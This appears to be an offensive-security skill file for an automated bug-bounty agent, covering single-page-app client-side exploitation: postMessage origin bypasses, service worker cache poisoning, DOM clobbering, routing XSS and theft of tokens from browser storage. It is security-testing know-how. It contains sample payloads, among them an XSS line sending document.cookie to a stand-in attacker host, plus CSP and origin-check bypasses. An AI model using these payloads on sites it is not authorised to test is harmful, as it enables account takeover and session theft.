---
name: spa-client-side
category: vulnerabilities
description: Single-page-app exploitation — postMessage handlers, service worker cache poisoning, client-side prototype pollution, DOM clobbering, client-side routing DOM XSS, token theft from storage. The bugs HTTP-only agents miss.
depends_on: []
---

# SPA Client-Side Exploitation

Most automated bug-bounty systems are HTTP-only — they probe endpoints and
diff responses. React / Next.js / Vue / Svelte apps hide an entire second
attack surface *inside the browser*: postMessage listeners, service workers,
JS-level routing, and storage-based auth. These bugs survive every WAF,
never show up in a curl, and cannot be fuzzed from the network.

Pair with `reconnaissance/js_runtime_audit.md` for the probing substrate
(DevTools breakpoints, fetch/XHR monkey-patching, storage dumps). This skill
is the *offensive* half: given that you now see the client state, what can
you break.

## When to Use

- Target is a React / Next.js / Vue / Svelte / Angular / Remix SPA
- You see `<script type="module">`, framework dev hints, or `__NEXT_DATA__`
  / `__NUXT__` / `__remix*` / `__SVELTEKIT__` globals
- The page registers a service worker (check `navigator.serviceWorker`)
- Deep-linked URLs control route state client-side
- Auth state is held in `localStorage`, `sessionStorage`, or IndexedDB
- The app communicates with iframes (OAuth popups, chat widgets, payment
  processors, embedded dashboards)

## Attack Surface

**Cross-Context Messaging**
- `window.postMessage` handlers accepting attacker-origin messages
- `BroadcastChannel` listeners (tab-to-tab)
- `MessageChannel` / `port.onmessage`
- Payment / OAuth popup callbacks (`window.opener`, `window.parent`)
- `window.name` propagation across navigations
- `document.domain` relaxation between sibling subdomains

**Client-Side Routing**
- `pushState` / `replaceState` handlers that parse hash or query
- `useRouter` / `useSearchParams` reading untrusted URL state
- Route guards that rely on client-side checks only
- Server components (Next.js App Router) that render user input into HTML

**Storage Auth**
- JWT in `localStorage` or `sessionStorage` exfiltrable by any XSS
- Refresh tokens in cookies without `HttpOnly` / `Secure` / `SameSite`
- IndexedDB records with session keys or PII
- Cache Storage holding authenticated responses

**Service Workers**
- Wildcard `fetch` handlers that can be poisoned
- Cache-then-network flows that serve stale attacker content
- `importScripts` from attacker-controllable URLs
- Push-notification handlers opening arbitrary URLs

**DOM**
- `innerHTML` / `dangerouslySetInnerHTML` / `v-html` sinks
- DOM clobbering via `<form name=X>` or `<img id=X>` overriding globals
- Custom element lifecycle callbacks parsing attributes
- Trusted Types bypass via `unsafe-*` directives in CSP

## High-Value Targets

### postMessage Handlers

Enumerate every registered listener before testing:

```javascript
// Paste into DevTools console on the target page
(function snapshotMessageListeners() {
  const orig = EventTarget.prototype.addEventListener;
  const found = [];
  EventTarget.prototype.addEventListener = function (type, handler, opts) {
    if (type === "message" || type === "messageerror") {
      found.push({ target: this, handler: handler.toString().slice(0, 400) });
    }
    return orig.call(this, type, handler, opts);
  };
  window._capturedMessageHandlers = found;
  console.log("Hook installed — reload the page, then inspect _capturedMessageHandlers");
})();
```

For each handler, check:
- Is `event.origin` validated? Is the check a prefix match (`startsWith`) or
  an exact equality? Prefix matches bleed across `evil-target.com`.
- Is `event.source` trusted, or is any frame allowed to send messages?
- Does the handler `eval`, `innerHTML`, or `document.write` the payload?
- Does it forward data to `fetch` or `window.open` without sanitization?

### Service Worker Cache Poisoning

Service workers intercept every request in scope. A poisoned cache serves
attacker content on every future visit — *persistent XSS with no input
required*. Poisoning requires one of: a cached XSS response from a vulnerable
endpoint, `stale-while-revalidate` on an attacker-controllable path, or an SW
using `importScripts(userInput)`.

### SPA Routing DOM XSS

React / Next.js patterns that leak untrusted data into the DOM:

```jsx
// Vulnerable
<div dangerouslySetInnerHTML={{ __html: searchParams.get("bio") }} />

// Vulnerable — useRouter hash is trusted
const { asPath } = useRouter();
document.title = asPath.split("#")[1];  // prototype pollution or XSS
```

Vue and Svelte equivalents:

```vue
<!-- Vue: v-html on user input -->
<div v-html="route.query.msg"></div>

<!-- Svelte: {@html} -->
{@html $page.url.searchParams.get("content")}
```

Inspect the Next.js `__NEXT_DATA__` blob for `pageProps` fields that mirror
query parameters — those often flow to `dangerouslySetInnerHTML`.

### Client-Side Prototype Pollution

Fingerprint vulnerable merge/clone/query-parse libraries in bundles.
Test with `?__proto__[x]=polluted` — if `Object.prototype.x` becomes
`"polluted"`, identify the gadget by walking the bundle for unguarded
`obj.x || default` reads. See `vulnerabilities/prototype_pollution.md` for
the full gadget catalogue.

### DOM Clobbering

Named DOM elements become globals. Attacker-controlled HTML (forum post,
profile bio) can shadow a JS variable: `<form id="config"><input
name="endpoint" value="https://attacker/oauth">`. Grep the bundle for
`window.CONFIG ||` or `typeof X === "undefined"` — each is a clobber target.

### Storage Token Theft Patterns

| Framework / SDK | Where it stores auth | Grep |
|---|---|---|
| Auth0 SPA SDK | `localStorage["@@auth0spajs@@"]` | `auth0spajs` |
| AWS Amplify | `localStorage["CognitoIdentityServiceProvider.*"]` | `CognitoIdentityServiceProvider` |
| Firebase Auth | `localStorage["firebase:authUser:*"]` | `firebase:authUser` |
| Supabase | `localStorage["supabase.auth.token"]` | `supabase.auth.token` |
| Clerk | `localStorage["__clerk_*"]` | `__clerk_` |
| NextAuth (session) | cookie `next-auth.session-token` | `next-auth.session-token` |

If the SPA stores long-lived tokens in `localStorage`, any reflected XSS —
including self-XSS elevated by postMessage — is immediately account takeover.

### Web Worker / SharedWorker Abuse

Check: worker scripts served with `Access-Control-Allow-Origin: *`, workers
loaded from attacker-controllable subpaths, `importScripts(userInput)`, and
missing message validation between worker and main thread.

## Discovery Signals

| Signal | Where to Check | What It Indicates |
|---|---|---|
| `__NEXT_DATA__` / `__NUXT__` / `__SVELTEKIT__` global | DevTools console | SSR framework with hydration — pageProps may mirror query params |
| `event.origin` or `parentOrigin` in JS bundle | Grep minified chunks | postMessage handler — check if validation is exact-equality |
| `self.addEventListener('fetch', ...)` in SW | `navigator.serviceWorker.getRegistrations()` | Service worker with cache-poisoning surface |
| `configUrl` / `spec` / `url` param on doc pages | Swagger UI, GraphQL Playground, Storybook | Vendored tool XSS via `data:` / `javascript:` URI scheme |
| `.js.map` files responding 200 | `/_next/static/chunks/*.js.map`, `/static/js/*.map` | Exposed source maps — full unmangled source |
| `localStorage` keys matching `auth0`, `supabase`, `firebase`, `clerk`, `cognito` | DevTools Application tab | Client-side token storage — any XSS = ATO |
| Autocomplete / combobox rendering user input | Type in search, watch DOM | Interactive-component XSS (fires on keystroke, not page load) |
| `document.domain = "target.com"` in bundle | Grep JS source | Subdomain trust relaxation — XSS on sibling = full domain access |
| `window.opener` / `window.parent` references | JS bundle grep | Cross-window communication — popup/iframe callback surface |
| `jQuery.after()` / `jQuery.html()` / `jQuery.append()` | JS bundle grep | jQuery DOM sinks that execute `<script>` (unlike raw innerHTML) |
| `webWorkerExtensionHostIframe.html` or Code OSS paths | Asset path enumeration | Shared upstream component (Code OSS) with `parentOrigin` param trust |
| `?dest=`, `?next=`, `?return=`, `?redirect=` on login page | URL parameter enumeration | Post-login redirect — test `javascript:` URI for XSS upgrade |

## Framework-Specific DOM XSS Matrix

Focus on SPA-routing-specific sinks where URL state flows to DOM. For generic
innerHTML / v-html catalogs, see `vulnerabilities/xss.md`.

| Framework | Dangerous Pattern | Payload Vector | Condition |
|---|---|---|---|
| React | `dangerouslySetInnerHTML={{ __html: searchParams.get("x") }}` | URL query param | Dev passes URL state to JSX without sanitization |
| React | `<a href={userInput}>` with `javascript:` | URL / form input | React does NOT block `javascript:` in href (pre-v16.9 silent, post-v16.9 warning only) |
| Next.js | `__NEXT_DATA__.pageProps` mirroring query → SSR HTML | Query params reflected in server-rendered pageProps | SSR hydration renders attacker HTML before client sanitizes |
| Next.js App Router | Server component rendering `params.slug` into HTML | Route segment params | Server components bypass client-side sanitization |
| Vue | `v-html="route.query.msg"` | URL query param | Vue explicitly trusts v-html content |
| Vue / Nuxt | `__NUXT__` payload containing user input | SSR hydration data | Nuxt SSR serializes page data including query reflection |
| Svelte | `{@html $page.url.searchParams.get("x")}` | URL query param | `{@html}` is raw HTML insertion |
| Angular | `[innerHTML]="userInput"` with `bypassSecurityTrustHtml()` | Any user input | Developer explicitly bypasses Angular sanitizer |
| AngularJS 1.x | `{{constructor.constructor('alert(1)')()}}` | Any interpolated field | Legacy sandbox escape — stored DoS even if XSS blocked |
| Swagger UI | `?configUrl=data:text/html;base64,...` | URL parameter | Vendored Swagger UI < 4.1.3 accepts `data:` URI scheme |

## Client-Side Auth Bypass Patterns

| Pattern | Bypass Technique | Impact |
|---|---|---|
| Route guard checks `localStorage.isAdmin` | Set `localStorage.isAdmin = "true"` in console | Access admin UI (may still need server bypass) |
| JWT decoded client-side for role display | Modify JWT payload in localStorage (unsigned check) | UI-level privilege escalation |
| `window.postMessage` with `parentOrigin` URL param | Embed iframe with `parentOrigin=https://attacker.com` | Attacker declares themselves trusted parent (Code OSS pattern) |
| Origin check via `startsWith("https://trusted")` | `https://trusted.com.evil.com` passes prefix match | Cross-origin message acceptance |
| Origin check allowlists `"null"` | `<iframe sandbox src="data:text/html,...">` sends origin `"null"` | Sandboxed iframe bypasses dev-mode check |
| OAuth popup reads `window.opener.location` | Attacker page opens OAuth popup, reads callback | Authorization code theft |
| Cookie `Domain=.target.com` shared across subdomains | XSS on any subdomain steals main-domain session | Subdomain bug = org-wide ATO |
| `Referer: http://127.0.0.1` skips auth headers | Set Referer to localhost value | Debug/internal auth bypass surviving to production |

## Source Map and Build Artifact Exploitation

| Artifact | What It Reveals | How to Find | Impact |
|---|---|---|---|
| `.js.map` source maps | Full unmangled source, variable names, origin checks | `/_next/static/chunks/*.js.map`, `/static/js/*.map`, `//# sourceMappingURL=` comments | Reverse-engineer auth logic, find hardcoded keys |
| `__NEXT_DATA__` JSON blob | Server-side props, API endpoints, user data | View page source, search `<script id="__NEXT_DATA__">` | Leaked API keys, internal URLs, PII in SSR props |
| `__NUXT__` / `window.__NUXT__` | Hydration payload with server state | View source or console | Same as above for Nuxt apps |
| `.env.local` / `.env.production` in bundle | Environment variables compiled into JS | `grep -r "NEXT_PUBLIC_\|VITE_\|REACT_APP_" chunks/*.js` | API keys, feature flags, internal endpoints |
| Webpack chunk manifest | Full route map and code-split structure | `/_next/static/BUILD_ID/_buildManifest.js` | Hidden admin routes, unreleased features |
| Storybook / GraphQL Playground | Component library / API explorer | `/storybook/`, `/graphql`, `/__graphql` | Internal component state, full API schema |

## Key Vulnerabilities

### Origin Validation Bypass (postMessage)

`if (event.origin.startsWith("https://trusted.com"))` matches
`https://trusted.com.evil.com`. Always test the exact-equality case.

### Null Origin Sandbox Trick

`<iframe sandbox src="data:text/html,...">` can postMessage with
`event.origin === "null"`. Handlers that allowlist `"null"` for dev mode
are exploitable via any sandboxed iframe embedded on an attacker page.

### Cache Storage Privilege Escalation

Many SWs cache API responses with authenticated data. If the SW's cache key
doesn't include the auth token, two users on the same browser can see each
other's cached responses.

### Hash-Based Routing Reflection

`window.addEventListener("hashchange", e => element.innerHTML = location.hash)`
is an XSS via `#<img src=x onerror=fetch('//attacker/?c='+document.cookie)>`
— exploitable cross-origin by opening the URL in a popup.

## Defense-Bypass Pairs

| Defense | Bypass | Corpus Evidence |
|---|---|---|
| `script-src 'self'` CSP | Same-origin JSONP endpoint, uploaded `.js`, or bundled polyfill that evaluates URL params | Swagger UI `configUrl=data:` bypasses self-only CSP ($9.4k Shopify) |
| `script-src 'unsafe-eval'` | AngularJS sandbox escape `{{constructor.constructor('...')()}}` | GSoC DoS/XSS via template injection ($10k Google) |
| CSP blocks `<script>` execution | `jQuery.after()` / `jQuery.html()` execute scripts via jQuery's HTML parser | Fitbit DOM XSS via jQuery.after() bypassed innerHTML script-block ($10k) |
| Outgoing message sanitizer strips payloads | Inject at WebSocket / binary protocol layer below sanitizer | Steam chat XSS via BBCode at WS level ($7.5k Valve) |
| URL scheme filter blocks `http`/`https` only | `javascript:`, `data:text/html`, `blob:` URIs pass through | Reddit `dest=javascript:...` post-login XSS ($5k) |
| `event.origin` check present | Prefix match `startsWith()` instead of `===` | Meta postMessage handler matched `trusted.com.evil.com` |
| Same-origin policy on `fetch`/XHR | `<audio>`/`<video>` tag cross-origin inclusion + MediaRecorder re-capture | Google Voice Activity recordings leaked cross-origin ($50k) |
| Per-user hostname obscurity | Open redirect leaks hostname via `@attacker.com` userinfo trick | Google Cloud Shell hostname leak + XSS chain ($5k) |
| Trusted Types enforcement | Find a `createPolicy()` with permissive validation accepting any string | — |
| `document.domain` restriction | Both subdomains set `document.domain = "target.com"` — XSS on either gets both | Fitbit subdomain cookie scope attack |

## Testing Methodology

1. **Inventory listeners** — install the `addEventListener` hook before the
   app boots to capture every postMessage / BroadcastChannel handler.
2. **Dump storage** — localStorage, sessionStorage, IndexedDB, Cache
   Storage, cookies. Identify tokens and PII keys.
3. **Map routing** — inspect `__NEXT_DATA__`, `__NUXT__`, `router` calls.
   Note every place URL state feeds into the DOM.
4. **Library fingerprint** — extract names/versions from bundle. Check
   retire.js for prototype-pollution and jQuery CVEs.
5. **Cross-origin postMessage** — from an attacker page, embed target as
   iframe and postMessage it. Note reactions.
6. **Service worker enumeration** — list scopes, inspect cache contents.
7. **Clobber test** — for unguarded `window.X` reads, submit `<form id=X>`.

## Chain Patterns

| Chain | Steps | Corpus Bounty |
|---|---|---|
| Open redirect + postMessage listener | Redirect leaks hostname/code, postMessage handler accepts attacker origin | $5k (Google Cloud Shell) |
| Subdomain XSS + cookie domain scope | XSS on marketing subdomain, `Domain=.target.com` cookies give main-app ATO | $10k (Fitbit healthsolutions subdomain) |
| Shared upstream component + multi-target reporting | Bug in Code OSS `parentOrigin` param, report to every embedder (GitLab, Google IDX, Codespaces) | $22.5k (Google IDX) |
| jQuery DOM sink + WP user enum + cookie scope | `jQuery.after()` XSS + `/wp-json/wp/v2/users` slug-to-email + HIBP credential stuff | $10k (Fitbit multi-path) |
| Service worker poison + cached auth response | Poison SW cache once, serve attacker content on every future visit | Persistent ATO (no credential needed after poison) |
| Prototype pollution (`qs`/`lodash`) + gadget in app state | Pollute `__proto__` via query string, gadget chain triggers XSS in rendering | — |
| `javascript:` URI in redirect param + auto-login | `?dest=javascript:...` on login page, SameSite=Lax auto-sends cookies | $5k (Reddit accounts.reddit.com) |
| SSR hydration data injection + client-side rendering | Inject payload into `__NEXT_DATA__` via reflected query, client renders unsanitized | $20k (Google Cloud Skills Boost) |

## Validation

1. Show the exact line of vulnerable code (`innerHTML =`, missing
   `event.origin` check, etc.) in the minified bundle.
2. Provide an attacker-hosted HTML PoC that triggers without credentials on
   the victim's browser.
3. For postMessage issues, screenshot the captured message + the resulting
   DOM / state change.
4. For service worker poisoning, demonstrate persistence across a hard
   navigation.
5. For prototype pollution, confirm `Object.prototype.X` is set AND
   identify the gadget that turns it into execution.

## False Positives

- `event.origin === location.origin` IS a correct check; don't report it.
- Self-XSS via `JSON.parse(localStorage)` with no exfil path is
  informational unless you show how an attacker plants the payload.
- DOM clobbering requires an attacker-controlled HTML injection AND an
  unguarded global read. Missing either half is not a finding.
- Prototype pollution without a gadget is low-impact at best.
- Storage-only PII is not XSS; test whether an XSS would reach it.

## Impact

- Persistent account takeover via cached responses or storage tokens
- Universal XSS affecting every visitor after a single poisoning
- OAuth / SSO code theft bypassing CSRF and state checks
- Cross-subdomain session hijack via origin relaxation
- Privilege escalation by clobbering authorization state

## Pro Tips

1. Install the `addEventListener` hook *before* `DOMContentLoaded` to catch
   synchronous listener registration during bundle init.
2. Service worker bugs are the highest-impact SPA class because they
   persist past a hard reload. Always check `navigator.serviceWorker`.
3. `postMessage` handlers in OAuth popup flows are a gold mine —
   auth providers frequently trust `event.origin` loosely.
4. Fingerprint the SPA router *first* (hash / history / file-based). Each
   has different attack surface.
5. Use Chrome DevTools MCP tools
   (`mcp__chrome-devtools__evaluate_script`, `take_snapshot`,
   `list_console_messages`) to automate listener enumeration during
   scans — HTTP-only agents cannot.
6. Bundle source maps, when exposed, often give you unmangled listener
   names and origin checks — always check `/_next/static/chunks/*.js.map`
   and friends.
7. Two XSS sinks on different subdomains + `document.domain` = one full
   ATO chain; don't stop after the first reflected XSS.
8. If CSP blocks your payload, pivot through an existing trusted script
   rather than trying to bypass the policy directly. SPAs almost always
   ship a helpful polyfill.
9. Autocomplete and combobox components are hidden XSS surfaces — they
   render on keystroke, not page load. If `keywords=` pre-fills the
   search and a backspace triggers the autocomplete render, you have
   reflected XSS that static reflection tests miss ($20k Google pattern).
10. When you find a bug in a shared upstream component (Code OSS, Swagger
    UI, jQuery, Lodash), grep all your targets for the component's
    signature files and report each embedder separately. One Code OSS
    `parentOrigin` bug = bounties from GitLab, Google IDX, Codespaces.
11. For per-user/per-tenant hostnames (Cloud Shell, Heroku, Vercel
    previews), pair "I have XSS but need the hostname" with an open
    redirect that leaks the host via `@attacker.com` userinfo trick.
12. Every `?dest=`, `?next=`, `?return=`, `?redirect=` parameter on a
    login page is an XSS candidate via `javascript:` URI — not just an
    open redirect. Test the URI scheme, not just the domain.
13. `jQuery.after()`, `.append()`, `.prepend()`, `.html()`, `.replaceWith()`
    all execute `<script>` tags, unlike raw `innerHTML`. If the target
    uses jQuery, test these sinks even when innerHTML is blocked.
14. Decode and diff `__NEXT_DATA__` / `__NUXT__` across pages — if any
    `pageProps` field mirrors a query parameter, that field is a
    server-side reflected XSS candidate during SSR hydration.

## Cross-References

- `reconnaissance/js_runtime_audit.md` — DevTools probing + storage dumps
- `reconnaissance/js_analysis.md` — static framework + secret fingerprinting
- `reconnaissance/js_deobfuscation.md` — source map recovery
- `vulnerabilities/prototype_pollution.md` — pollution payload catalogue
- `vulnerabilities/xss.md` — generic XSS sink catalogue
- `vulnerabilities/oauth_oidc_attacks.md` — OAuth flow specifics
- `vulnerabilities/session_security.md` — token storage rules

## Summary

Any app with more JS than HTML has a second attack surface that HTTP
probes cannot see. postMessage handlers, service workers, client-side
routing, and storage-based auth are where chain-worthy impact lives. Build
the client-side inventory once — listeners, storage keys, SW scopes,
routing sinks — and you'll spot bugs no agent or scanner without browser
context will ever reach.
